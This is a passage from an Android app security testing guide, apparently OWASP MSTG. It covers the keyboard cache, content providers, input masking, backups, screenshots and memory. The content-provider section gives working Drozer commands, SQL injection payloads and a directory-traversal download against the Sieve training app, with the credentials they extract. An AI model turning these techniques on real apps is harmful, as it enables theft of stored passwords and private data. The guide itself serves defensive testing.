should be checked for sensitive information, such as PII in a tracker or
ad service.

\hypertarget{determining-whether-the-keyboard-cache-is-disabled-for-text-input-fields-mstg-storage-5}{%
\subsubsection{Determining Whether the Keyboard Cache Is Disabled for
Text Input Fields
(MSTG-STORAGE-5)}\label{determining-whether-the-keyboard-cache-is-disabled-for-text-input-fields-mstg-storage-5}}

\hypertarget{overview-7}{%
\paragraph{Overview}\label{overview-7}}

When users type in input fields, the software automatically suggests
data. This feature can be very useful for messaging apps. However, the
keyboard cache may disclose sensitive information when the user selects
an input field that takes this type of information.

\hypertarget{static-analysis-15}{%
\paragraph{Static Analysis}\label{static-analysis-15}}

In the layout definition of an activity, you can define
\texttt{TextViews} that have XML attributes. If the XML attribute
\texttt{android:inputType} is given the value
\texttt{textNoSuggestions}, the keyboard cache will not be shown when
the input field is selected. The user will have to type everything
manually.

\begin{Shaded}
\begin{Highlighting}[]
   \KeywordTok{<EditText}
\OtherTok{        android:id=}\StringTok{"@+id/KeyBoardCache"}
\OtherTok{        android:inputType=}\StringTok{"textNoSuggestions"} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}

The code for all input fields that take sensitive information should
include this XML attribute to
\href{https://developer.android.com/reference/android/text/InputType.html\#TYPE_TEXT_FLAG_NO_SUGGESTIONS}{disable
the keyboard suggestions}.

\hypertarget{dynamic-analysis-12}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-12}}

Start the app and click in the input fields that take sensitive data. If
strings are suggested, the keyboard cache has not been disabled for
these fields.

\hypertarget{determining-whether-sensitive-stored-data-has-been-exposed-via-ipc-mechanisms-mstg-storage-6}{%
\subsubsection{Determining Whether Sensitive Stored Data Has Been
Exposed via IPC Mechanisms
(MSTG-STORAGE-6)}\label{determining-whether-sensitive-stored-data-has-been-exposed-via-ipc-mechanisms-mstg-storage-6}}

\hypertarget{overview-8}{%
\paragraph{Overview}\label{overview-8}}

As part of Android's IPC mechanisms, content providers allow an app's
stored data to be accessed and modified by other apps. If not properly
configured, these mechanisms may leak sensitive data.

\hypertarget{static-analysis-16}{%
\paragraph{Static Analysis}\label{static-analysis-16}}

The first step is to look at \texttt{AndroidManifest.xml} to detect
content providers exposed by the app. You can identify content providers
by the \texttt{\textless{}provider\textgreater{}} element. Complete the
following steps:

\begin{itemize}
\tightlist
\item
  Determine whether the value of the export tag
  (\texttt{android:exported}) is \texttt{"true"}. Even if it is not, the
  tag will be set to \texttt{"true"} automatically if an
  \texttt{\textless{}intent-filter\textgreater{}} has been defined for
  the tag. If the content is meant to be accessed only by the app
  itself, set \texttt{android:exported} to \texttt{"false"}. If not, set
  the flag to \texttt{"true"} and define proper read/write permissions.
\item
  Determine whether the data is being protected by a permission tag
  (\texttt{android:permission}). Permission tags limit exposure to other
  apps.
\item
  Determine whether the \texttt{android:protectionLevel} attribute has
  the value \texttt{signature}. This setting indicates that the data is
  intended to be accessed only by apps from the same enterprise (i.e.,
  signed with the same key). To make the data accessible to other apps,
  apply a security policy with the
  \texttt{\textless{}permission\textgreater{}} element and set a proper
  \texttt{android:protectionLevel}. If you use
  \texttt{android:permission}, other applications must declare
  corresponding \texttt{\textless{}uses-permission\textgreater{}}
  elements in their manifests to interact with your content provider.
  You can use the \texttt{android:grantUriPermissions} attribute to
  grant more specific access to other apps; you can limit access with
  the \texttt{\textless{}grant-uri-permission\textgreater{}} element.
\end{itemize}

Inspect the source code to understand how the content provider is meant
to be used. Search for the following keywords:

\begin{itemize}
\tightlist
\item
  \texttt{android.content.ContentProvider}
\item
  \texttt{android.database.Cursor}
\item
  \texttt{android.database.sqlite}
\item
  \texttt{.query}
\item
  \texttt{.update}
\item
  \texttt{.delete}
\end{itemize}

\begin{quote}
To avoid SQL injection attacks within the app, use parameterized query
methods, such as \texttt{query}, \texttt{update}, and \texttt{delete}.
Be sure to properly sanitize all method arguments; for example, the
\texttt{selection} argument could lead to SQL injection if it is made up
of concatenated user input.
\end{quote}

If you expose a content provider, determine whether parameterized
\href{https://developer.android.com/reference/android/content/ContentProvider.html\#query\%28android.net.Uri\%2C\%20java.lang.String\%5B\%5D\%2C\%20java.lang.String\%2C\%20java.lang.String\%5B\%5D\%2C\%20java.lang.String\%29}{query
methods} (\texttt{query}, \texttt{update}, and \texttt{delete}) are
being used to prevent SQL injection. If so, make sure all their
arguments are properly sanitized.

We will use the vulnerable password manager app
\href{https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk}{Sieve}
as an example of a vulnerable content provider.

\hypertarget{inspect-the-android-manifest}{%
\subparagraph{Inspect the Android
Manifest}\label{inspect-the-android-manifest}}

Identify all defined \texttt{\textless{}provider\textgreater{}}
elements:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<provider}
\OtherTok{      android:authorities=}\StringTok{"com.mwr.example.sieve.DBContentProvider"}
\OtherTok{      android:exported=}\StringTok{"true"}
\OtherTok{      android:multiprocess=}\StringTok{"true"}
\OtherTok{      android:name=}\StringTok{".DBContentProvider"}\KeywordTok{>}
    \KeywordTok{<path{-}permission}
\OtherTok{          android:path=}\StringTok{"/Keys"}
\OtherTok{          android:readPermission=}\StringTok{"com.mwr.example.sieve.READ\_KEYS"}
\OtherTok{          android:writePermission=}\StringTok{"com.mwr.example.sieve.WRITE\_KEYS"}
     \KeywordTok{/>}
\KeywordTok{</provider>}
\KeywordTok{<provider}
\OtherTok{      android:authorities=}\StringTok{"com.mwr.example.sieve.FileBackupProvider"}
\OtherTok{      android:exported=}\StringTok{"true"}
\OtherTok{      android:multiprocess=}\StringTok{"true"}
\OtherTok{      android:name=}\StringTok{".FileBackupProvider"}
\KeywordTok{/>}
\end{Highlighting}
\end{Shaded}

As shown in the \texttt{AndroidManifest.xml} above, the application
exports two content providers. Note that one path (``/Keys'') is
protected by read and write permissions.

\hypertarget{inspect-the-source-code}{%
\subparagraph{Inspect the source code}\label{inspect-the-source-code}}

Inspect the \texttt{query} function in the
\texttt{DBContentProvider.java} file to determine whether any sensitive
information is being leaked:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \BuiltInTok{Cursor} \FunctionTok{query}\NormalTok{(}\DataTypeTok{final}\NormalTok{ Uri uri, }\DataTypeTok{final} \BuiltInTok{String}\NormalTok{[] array, }\DataTypeTok{final} \BuiltInTok{String}\NormalTok{ s, }\DataTypeTok{final} \BuiltInTok{String}\NormalTok{[] array2, }\DataTypeTok{final} \BuiltInTok{String}\NormalTok{ s2) \{}
    \DataTypeTok{final} \DataTypeTok{int}\NormalTok{ match = }\KeywordTok{this}\NormalTok{.}\FunctionTok{sUriMatcher}\NormalTok{.}\FunctionTok{match}\NormalTok{(uri);}
    \DataTypeTok{final}\NormalTok{ SQLiteQueryBuilder sqLiteQueryBuilder = }\KeywordTok{new} \FunctionTok{SQLiteQueryBuilder}\NormalTok{();}
    \KeywordTok{if}\NormalTok{ (match >= }\DecValTok{100}\NormalTok{ \&\& match < }\DecValTok{200}\NormalTok{) \{}
\NormalTok{        sqLiteQueryBuilder.}\FunctionTok{setTables}\NormalTok{(}\StringTok{"Passwords"}\NormalTok{);}
\NormalTok{    \}}
    \KeywordTok{else} \KeywordTok{if}\NormalTok{ (match >= }\DecValTok{200}\NormalTok{) \{}
\NormalTok{        sqLiteQueryBuilder.}\FunctionTok{setTables}\NormalTok{(}\StringTok{"Key"}\NormalTok{);}
\NormalTok{    \}}
    \KeywordTok{return}\NormalTok{ sqLiteQueryBuilder.}\FunctionTok{query}\NormalTok{(}\KeywordTok{this}\NormalTok{.}\FunctionTok{pwdb}\NormalTok{.}\FunctionTok{getReadableDatabase}\NormalTok{(), array, s, array2, (}\BuiltInTok{String}\NormalTok{)}\KeywordTok{null}\NormalTok{, (}\BuiltInTok{String}\NormalTok{)}\KeywordTok{null}\NormalTok{, s2);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Here we see that there are actually two paths, ``/Keys'' and
``/Passwords'', and the latter is not being protected in the manifest
and is therefore vulnerable.

When accessing a URI, the query statement returns all passwords and the
path \texttt{Passwords/}. We will address this in the ``Dynamic
Analysis'' section and show the exact URI that is required.

\hypertarget{dynamic-analysis-13}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-13}}

\hypertarget{testing-content-providers}{%
\subparagraph{Testing Content
Providers}\label{testing-content-providers}}

To dynamically analyze an application's content providers, first
enumerate the attack surface: pass the app's package name to the Drozer
module \texttt{app.provider.info}:

\begin{verbatim}
dz> run app.provider.info -a com.mwr.example.sieve
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
\end{verbatim}

In this example, two content providers are exported. Both can be
accessed without permission, except for the \texttt{/Keys} path in the
\texttt{DBContentProvider}. With this information, you can reconstruct
part of the content URIs to access the \texttt{DBContentProvider} (the
URIs begin with \texttt{content://}).

To identify content provider URIs within the application, use Drozer's
\texttt{scanner.provider.finduris} module. This module guesses paths and
determines accessible content URIs in several ways:

\begin{verbatim}
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
\end{verbatim}

Once you have a list of accessible content providers, try to extract
data from each provider with the \texttt{app.provider.query} module:

\begin{verbatim}
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 - encoded)
email: incognitoguy50@gmail.com
\end{verbatim}

You can also use Drozer to insert, update, and delete records from a
vulnerable content provider:

\begin{itemize}
\item
  Insert record

\begin{verbatim}
dz> run app.provider.insert content://com.vulnerable.im/messages
                --string date 1331763850325
                --string type 0
                --integer _id 7
\end{verbatim}
\item
  Update record

\begin{verbatim}
dz> run app.provider.update content://settings/secure
                --selection "name=?"
                --selection-args assisted_gps_enabled
                --integer value 0
\end{verbatim}
\item
  Delete record

\begin{verbatim}
dz> run app.provider.delete content://settings/secure
                --selection "name=?"
                --selection-args my_setting
\end{verbatim}
\end{itemize}

\hypertarget{sql-injection-in-content-providers}{%
\subparagraph{SQL Injection in Content
Providers}\label{sql-injection-in-content-providers}}

The Android platform promotes SQLite databases for storing user data.
Because these databases are based on SQL, they may be vulnerable to SQL
injection. You can use the Drozer module \texttt{app.provider.query} to
test for SQL injection by manipulating the projection and selection
fields that are passed to the content provider:

\begin{verbatim}
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
\end{verbatim}

If an application is vulnerable to SQL Injection, it will return a
verbose error message. SQL Injection on Android may be used to modify or
query data from the vulnerable content provider. In the following
example, the Drozer module \texttt{app.provider.query} is used to list
all the database tables:

\begin{verbatim}
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
| table | Key              | Key              | 5        | CREATE TABLE ... |
\end{verbatim}

SQL Injection may also be used to retrieve data from otherwise protected
tables:

\begin{verbatim}
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
| Password | pin |
| thisismypassword | 9876 |
\end{verbatim}

You can automate these steps with the
\texttt{scanner.provider.injection} module, which automatically finds
vulnerable content providers within an app:

\begin{verbatim}
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
\end{verbatim}

\hypertarget{file-system-based-content-providers}{%
\subparagraph{File System Based Content
Providers}\label{file-system-based-content-providers}}

Content providers can provide access to the underlying filesystem. This
allows apps to share files (the Android sandbox normally prevents this).
You can use the Drozer modules \texttt{app.provider.read} and
\texttt{app.provider.download} to read and download files, respectively,
from exported file-based content providers. These content providers are
susceptible to directory traversal, which allows otherwise protected
files in the target application's sandbox to be read.

\begin{verbatim}
dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
Written 24488 bytes
\end{verbatim}

Use the \texttt{scanner.provider.traversal} module to automate the
process of finding content providers that are susceptible to directory
traversal:

\begin{verbatim}
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
\end{verbatim}

Note that \texttt{adb} can also be used to query content providers:

\begin{verbatim}
$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
Row: 0 id=1, username=admin, password=StrongPwd
Row: 1 id=2, username=test, password=test
...
\end{verbatim}

\hypertarget{checking-for-sensitive-data-disclosure-through-the-user-interface-mstg-storage-7}{%
\subsubsection{Checking for Sensitive Data Disclosure Through the User
Interface
(MSTG-STORAGE-7)}\label{checking-for-sensitive-data-disclosure-through-the-user-interface-mstg-storage-7}}

\hypertarget{overview-9}{%
\paragraph{Overview}\label{overview-9}}

Many apps require users to enter several kinds of data to, for example,
register an account or make a payment. Sensitive data may be exposed if
the app doesn't properly mask it, when displaying data in clear text.

Masking of sensitive data, by showing asterisk or dots instead of clear
text should be enforced within an app's activity to prevent disclosure
and mitigate risks such as shoulder surfing.

\hypertarget{static-analysis-17}{%
\paragraph{Static Analysis}\label{static-analysis-17}}

To make sure an application is masking sensitive user input, check for
the following attribute in the definition of EditText:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{android:inputType="textPassword"}
\end{Highlighting}
\end{Shaded}

With this setting, dots (instead of the input characters) will be
displayed in the text field, preventing the app from leaking passwords
or pins to the user interface.

\hypertarget{dynamic-analysis-14}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-14}}

To determine whether the application leaks any sensitive information to
the user interface, run the application and identify components that
either show such information or take it as input.

If the information is masked by, for example, replacing input with
asterisks or dots, the app isn't leaking data to the user interface.

\hypertarget{testing-backups-for-sensitive-data-mstg-storage-8}{%
\subsubsection{Testing Backups for Sensitive Data
(MSTG-STORAGE-8)}\label{testing-backups-for-sensitive-data-mstg-storage-8}}

\hypertarget{overview-10}{%
\paragraph{Overview}\label{overview-10}}

Like other modern mobile operating systems, Android offers auto-backup
features. The backups usually include copies of data and settings for
all installed apps. Whether sensitive user data stored by the app may
leak to those data backups is an obvious concern.

Given its diverse ecosystem, Android supports many backup options:

\begin{itemize}
\item
  Stock Android has built-in USB backup facilities. When USB debugging
  is enabled, you can use the \texttt{adb\ backup} command to create
  full data backups and backups of an app's data directory.
\item
  Google provides a ``Back Up My Data'' feature that backs up all app
  data to Google's servers.
\item
  Two Backup APIs are available to app developers:

  \begin{itemize}
  \item
    \href{https://developer.android.com/guide/topics/data/keyvaluebackup.html}{Key/Value
    Backup} (Backup API or Android Backup Service) uploads to the
    Android Backup Service cloud.
  \item
    \href{https://developer.android.com/guide/topics/data/autobackup.html}{Auto
    Backup for Apps}: With Android 6.0 (API level 23) and above, Google
    added the ``Auto Backup for Apps feature''. This feature
    automatically syncs at most 25MB of app data with the user's Google
    Drive account.
  \end{itemize}
\item
  OEMs may provide additional options. For example, HTC devices have a
  ``HTC Backup'' option that performs daily backups to the cloud when
  activated.
\end{itemize}

\hypertarget{static-analysis-18}{%
\paragraph{Static Analysis}\label{static-analysis-18}}

\hypertarget{local}{%
\subparagraph{Local}\label{local}}

Android provides an attribute called
\href{https://developer.android.com/guide/topics/manifest/application-element.html\#allowbackup}{\texttt{allowBackup}}
to back up all your application data. This attribute is set in the
\texttt{AndroidManifest.xml} file. If the value of this attribute is
\textbf{true}, the device allows users to back up the application with
Android Debug Bridge (ADB) via the command \texttt{\$\ adb\ backup}.

To prevent the app data backup, set the \texttt{android:allowBackup}
attribute to \textbf{false}. When this attribute is unavailable, the
allowBackup setting is enabled by default, and backup must be manually
deactivated.

\begin{quote}
Note: If the device was encrypted, then the backup files will be
encrypted as well.
\end{quote}

Check the \texttt{AndroidManifest.xml} file for the following flag:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{android:allowBackup="true"}
\end{Highlighting}
\end{Shaded}

If the flag value is \textbf{true}, determine whether the app saves any
kind of sensitive data (check the test case ``Testing for Sensitive Data
in Local Storage'').

\hypertarget{cloud}{%
\subparagraph{Cloud}\label{cloud}}

Regardless of whether you use key/value backup or auto backup, you must
determine the following:

\begin{itemize}
\tightlist
\item
  which files are sent to the cloud (e.g., SharedPreferences)
\item
  whether the files contain sensitive information
\item
  whether sensitive information is encrypted before being sent to the
  cloud.
\end{itemize}

\begin{quote}
If you don't want to share files with Google Cloud, you can exclude them
from
\href{https://developer.android.com/guide/topics/data/autobackup.html\#IncludingFiles}{Auto
Backup}. Sensitive information stored at rest on the device should be
encrypted before being sent to the cloud.
\end{quote}

\begin{itemize}
\tightlist
\item
  \textbf{Auto Backup}: You configure Auto Backup via the boolean
  attribute \texttt{android:allowBackup} within the application's
  manifest file.
  \href{https://developer.android.com/guide/topics/data/autobackup.html\#EnablingAutoBackup}{Auto
  Backup} is enabled by default for applications that target Android 6.0
  (API level 23). You can use the attribute
  \texttt{android:fullBackupOnly} to activate auto backup when
  implementing a backup agent, but this attribute is available for
  Android versions 6.0 and above only. Other Android versions use
  key/value backup instead.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{android:fullBackupOnly}
\end{Highlighting}
\end{Shaded}

Auto backup includes almost all the app files and stores up 25 MB of
them per app in the user's Google Drive account. Only the most recent
backup is stored; the previous backup is deleted.

\begin{itemize}
\tightlist
\item
  \textbf{Key/Value Backup}: To enable key/value backup, you must define
  the backup agent in the manifest file. Look in
  \texttt{AndroidManifest.xml} for the following attribute:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{android:backupAgent}
\end{Highlighting}
\end{Shaded}

To implement key/value backup, extend one of the following classes:

\begin{itemize}
\tightlist
\item
  \href{https://developer.android.com/reference/android/app/backup/BackupAgent.html}{BackupAgent}
\item
  \href{https://developer.android.com/reference/android/app/backup/BackupAgentHelper.html}{BackupAgentHelper}
\end{itemize}

To check for key/value backup implementations, look for these classes in
the source code.

\hypertarget{dynamic-analysis-15}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-15}}

After executing all available app functions, attempt to back up via
\texttt{adb}. If the backup is successful, inspect the backup archive
for sensitive data. Open a terminal and run the following command:

\begin{verbatim}
$ adb backup -apk -nosystem <package-name>
\end{verbatim}

ADB should respond now with ``Now unlock your device and confirm the
backup operation'' and you should be asked on the Android phone for a
password. This is an optional step and you don't need to provide one. If
the phone does not prompt this message, try the following command
including the quotes:

\begin{verbatim}
$ adb backup "-apk -nosystem <package-name>"
\end{verbatim}

The problem happens when your device has an adb version prior to 1.0.31.
If that's the case you must use an adb version of 1.0.31 also on your
host machine. Versions of adb after 1.0.32
\href{https://issuetracker.google.com/issues/37096097}{broke the
backwards compatibility.}

Approve the backup from your device by selecting the \emph{Back up my
data} option. After the backup process is finished, the file \emph{.ab}
will be in your working directory. Run the following command to convert
the .ab file to tar.

\begin{verbatim}
$ dd if=mybackup.ab bs=24 skip=1|openssl zlib -d > mybackup.tar
\end{verbatim}

In case you get the error
\texttt{openssl:Error:\ \textquotesingle{}zlib\textquotesingle{}\ is\ an\ invalid\ command.}
you can try to use Python instead.

\begin{verbatim}
$ dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
\end{verbatim}

The
\href{https://github.com/nelenkov/android-backup-extractor}{\emph{Android
Backup Extractor}} is another alternative backup tool. To make the tool
to work, you have to download the Oracle JCE Unlimited Strength
Jurisdiction Policy Files for
\href{https://www.oracle.com/technetwork/java/javase/downloads/jce-7-download-432124.html}{JRE7}
or
\href{http://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html}{JRE8}
and place them in the JRE lib/security folder. Run the following command
to convert the tar file:

\begin{verbatim}
$ java -jar abe.jar unpack backup.ab
\end{verbatim}

if it shows some Cipher information and usage, which means it hasn't
unpacked successfully. In this case you can give a try with more
arguments:

\begin{verbatim}
$ abe [-debug] [-useenv=yourenv] unpack <backup.ab> <backup.tar> [password]
\end{verbatim}

\begin{verbatim}
$ java -jar abe.jar unpack backup.ab backup.tar 123
\end{verbatim}

Extract the tar file to your working directory.

\begin{verbatim}
$ tar xvf mybackup.tar
\end{verbatim}

\hypertarget{finding-sensitive-information-in-auto-generated-screenshots-mstg-storage-9}{%
\subsubsection{Finding Sensitive Information in Auto-Generated
Screenshots
(MSTG-STORAGE-9)}\label{finding-sensitive-information-in-auto-generated-screenshots-mstg-storage-9}}

\hypertarget{overview-11}{%
\paragraph{Overview}\label{overview-11}}

Manufacturers want to provide device users with an aesthetically
pleasing experience at application startup and exit, so they introduced
the screenshot-saving feature for use when the application is
backgrounded. This feature may pose a security risk. Sensitive data may
be exposed if the user deliberately screenshots the application while
sensitive data is displayed. A malicious application that is running on
the device and able to continuously capture the screen may also expose
data. Screenshots are written to local storage, from which they may be
recovered by a rogue application (if the device is rooted) or someone
who has stolen the device.

For example, capturing a screenshot of a banking application may reveal
information about the user's account, credit, transactions, and so on.

\hypertarget{static-analysis-19}{%
\paragraph{Static Analysis}\label{static-analysis-19}}

A screenshot of the current activity is taken when an Android app goes
into background and displayed for aesthetic purposes when the app
returns to the foreground. However, this may leak sensitive information.

To determine whether the application may expose sensitive information
via the app switcher, find out whether the
\href{https://developer.android.com/reference/android/view/Display.html\#FLAG_SECURE}{\texttt{FLAG\_SECURE}}
option has been set. You should find something similar to the following
code snippet:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{getWindow}\NormalTok{().}\FunctionTok{setFlags}\NormalTok{(WindowManager.}\FunctionTok{LayoutParams}\NormalTok{.}\FunctionTok{FLAG\_SECURE}\NormalTok{,}
\NormalTok{                WindowManager.}\FunctionTok{LayoutParams}\NormalTok{.}\FunctionTok{FLAG\_SECURE}\NormalTok{);}

\FunctionTok{setContentView}\NormalTok{(R.}\FunctionTok{layout}\NormalTok{.}\FunctionTok{activity\_main}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

If the option has not been set, the application is vulnerable to screen
capturing.

\hypertarget{dynamic-analysis-16}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-16}}

While black-box testing the app, navigate to any screen that contains
sensitive information and click the home button to send the app to the
background, then press the app switcher button to see the snapshot. As
shown below, if \texttt{FLAG\_SECURE} is set (right image), the snapshot
will be empty; if the flag has not been set (left image), activity
information will be shown:

\begin{longtable}[]{@{}ll@{}}
\toprule
\begin{minipage}[b]{0.47\columnwidth}\raggedright
\texttt{FLAG\_SECURE} not set\strut
\end{minipage} & \begin{minipage}[b]{0.47\columnwidth}\raggedright
\texttt{FLAG\_SECURE} set\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.47\columnwidth}\raggedright
!{[}Images/Chapters/0x05d/1.png" width=``500px'' /\textgreater{}\strut
\end{minipage} & \begin{minipage}[t]{0.47\columnwidth}\raggedright
{[}Images/Chapters/0x05d/2.png{]}(Images/Chapters/0x05d/1.png"
width=``500px{]}(Images/Chapters/0x05d/2.png{]}(Images/Chapters/0x05d/1.png''
width="500px)\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

On devices supporting
\href{https://source.android.com/security/encryption/file-based}{file-based
encryption (FBE)}, snapshots are stored in the
\texttt{/data/system\_ce/\textless{}USER\_ID\textgreater{}/\textless{}IMAGE\_FOLDER\_NAME\textgreater{}}
folder. \texttt{\textless{}IMAGE\_FOLDER\_NAME\textgreater{}} depends on
the vendor but most common names are \texttt{snapshots} and
\texttt{recent\_images}. If the device doesn't support FBE, the
\texttt{/data/system/\textless{}IMAGE\_FOLDER\_NAME\textgreater{}}
folder is used.

\begin{quote}
Accessing these folders and the snapshots requires root.
\end{quote}

\hypertarget{checking-memory-for-sensitive-data-mstg-storage-10}{%
\subsubsection{Checking Memory for Sensitive Data
(MSTG-STORAGE-10)}\label{checking-memory-for-sensitive-data-mstg-storage-10}}

\hypertarget{overview-12}{%
\paragraph{Overview}\label{overview-12}}

Analyzing memory can help developers identify the root causes of several
problems, such as application crashes. However, it can also be used to
access sensitive data. This section describes how to check for data
disclosure via process memory.

First identify sensitive information that is stored in memory. Sensitive
assets have likely been loaded into memory at some point. The objective
is to verify that this information is exposed as briefly as possible.

To investigate an application's memory, you must first create a memory
dump. You can also analyze the memory in real-time, e.g., via a
debugger. Regardless of your approach, memory dumping is a very
error-prone process in terms of verification because each dump contains
the output of executed functions. You may miss executing critical
scenarios. In addition, overlooking data during analysis is probable
unless you know the data's footprint (either the exact value or the data
format). For example, if the app encrypts with a randomly generated
symmetric key, you likely won't be able to spot it in memory unless you
can recognize the key's value in another context.

Therefore, you are better off starting with static analysis.

\hypertarget{static-analysis-20}{%
\paragraph{Static Analysis}\label{static-analysis-20}}

For an overview of possible sources of data exposure, check the
documentation and identify application components before you examine the
source code. For example, sensitive data from a backend may be in the
HTTP client, the XML parser, etc. You want all these copies to be
removed from memory as soon as possible.

In addition, understanding the application's architecture and the
architecture's role in the system will help you identify sensitive
information that doesn't have to be exposed in memory at all. For
example, assume your app receives data from one server and transfers it
to another without any processing. That data can be handled in an
encrypted format, which prevents exposure in memory.

However, if you need to expose sensitive data in memory, you should make
sure that your app is designed to expose as few data copies as possible
as briefly as possible. In other words, you want the handling of
sensitive data to be centralized (i.e., with as few components as
possible) and based on primitive, mutable data structures.

The latter requirement gives developers direct memory access. Make sure
that they use this access to overwrite the sensitive data with dummy
data (typically zeroes). Examples of preferable data types include
\texttt{byte\ {[}{]}} and \texttt{char\ {[}{]}}, but not \texttt{String}
or \texttt{BigInteger}. Whenever you try to modify an immutable object
like \texttt{String}, you create and change a copy of the object.

Using non-primitive mutable types like \texttt{StringBuffer} and
\texttt{StringBuilder} may be acceptable, but it's indicative and
requires care. Types like \texttt{StringBuffer} are used to modify
content (which is what you want to do). To access such a type's value,
however, you would use the \texttt{toString} method, which would create
an immutable copy of the data. There are several ways to use these data
types without creating an immutable copy, but they require more effort
than simply using a primitive array. Safe memory management is one
benefit of using types like \texttt{StringBuffer} , but this can be a
two-edged sword. If you try to modify the content of one of these types
and the copy exceeds the buffer capacity, the buffer size will
automatically increase. The buffer content may be copied to a different
location, leaving the old content without a reference you can use to
overwrite it.

Unfortunately, few libraries and frameworks are designed to allow
sensitive data to be overwritten. For example, destroying a key, as
shown below, doesn't really remove the key from memory:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{SecretKey}\NormalTok{ secretKey = }\KeywordTok{new} \BuiltInTok{SecretKeySpec}\NormalTok{(}\StringTok{"key"}\NormalTok{.}\FunctionTok{getBytes}\NormalTok{(), }\StringTok{"AES"}\NormalTok{);}
\NormalTok{secretKey.}\FunctionTok{destroy}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

Overwriting the backing byte-array from \texttt{secretKey.getEncoded}
doesn't remove the key either; the SecretKeySpec-based key returns a
copy of the backing byte-array. See the sections below for the proper
way to remove a \texttt{SecretKey} from memory.

The RSA key pair is based on the \texttt{BigInteger} type and therefore
resides in memory after its first use outside the
\texttt{AndroidKeyStore}. Some ciphers (such as the AES \texttt{Cipher}
in \texttt{BouncyCastle}) do not properly clean up their byte-arrays.

User-provided data (credentials, social security numbers, credit card
information, etc.) is another type of data that may be exposed in
memory. Regardless of whether you flag it as a password field,
\texttt{EditText} delivers content to the app via the \texttt{Editable}
interface. If your app doesn't provide \texttt{Editable.Factory},
user-provided data will probably be exposed in memory for longer than
necessary. The default \texttt{Editable} implementation, the
\texttt{SpannableStringBuilder}, causes the same issues as Java's
\texttt{StringBuilder} and \texttt{StringBuffer} cause (discussed
above).

In summary, when performing static analysis to identify sensitive data
that is exposed in memory, you should:

\begin{itemize}
\tightlist
\item
  Try to identify application components and map where data is used.
\item
  Make sure that sensitive data is handled by as few components as
  possible.
\item
  Make sure that object references are properly removed once the object
  containing the sensitive data is no longer needed.
\item
  Make sure that garbage collection is requested after references have
  been removed.
\item
  Make sure that sensitive data gets overwritten as soon as it is no
  longer needed.

  \begin{itemize}
  \tightlist
  \item
    Don't represent such data with immutable data types (such as
    \texttt{String} and \texttt{BigInteger}).
  \item
    Avoid non-primitive data types (such as \texttt{StringBuilder}).
  \item
    Overwrite references before removing them, outside the
